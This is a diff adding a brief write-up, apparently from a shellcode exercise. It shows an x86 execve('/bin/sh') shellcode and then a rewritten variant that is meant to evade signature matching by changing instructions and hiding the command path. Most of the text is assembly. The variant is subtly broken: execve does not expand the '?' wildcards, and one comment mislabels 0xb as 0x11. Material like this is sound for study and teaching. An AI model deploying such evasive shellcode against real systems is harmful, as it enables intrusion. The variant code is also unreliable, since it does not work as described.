@@ -1,0 +1,30 @@
+Original shellcode:
+http://shell-storm.org/shellcode/files/shellcode-575.php
+
+Original shellcode was written by *ipv*. The paylod is rather simple: it's an execve syscall that launches /bin/sh.
+
+    push 0xb ; 11 for execve syscall
+    pop  eax ; push 0x11 into eax
+    cdq ; sets edx to null
+    push edx ; pushes null onto the stack
+    push 0x68732f2f ; '//sh'
+    push 0x6e69622f ; '/bin'
+    mov  ebx, esp ; saves ESP into EBX
+    xor  ecx, ecx ; null arguments
+    int  0x80 ; int syscall
+
+
+The shellcode is rather short at 21 bytes, so there is little to change. 
+
+To obfuscate the shellcode we can expand some of the instructions so they seem different compared to the original shellcode. First I used different method for nulling out registers, I xor'd eax and moved it's value into the other registers. After that, I used mov instead of push-pop for the execve syscall. The name of the command has also been obfuscated, so it's less obvious.
+
+    xor eax,eax ; null out eax
+    mov edx, eax ; null out edx
+    mov ecx, eax ; null out ecx
+    mov al, 0xb ; 11 execve syscall
+    push edx  ; push null to stack
+    push 0x683f2f2f ; "//?h"
+    push 0x6e3f3f2f ; "/??n"
+    mov ebx, esp ; stores executable path in ebx
+    int 0x80 ; init syscall
+
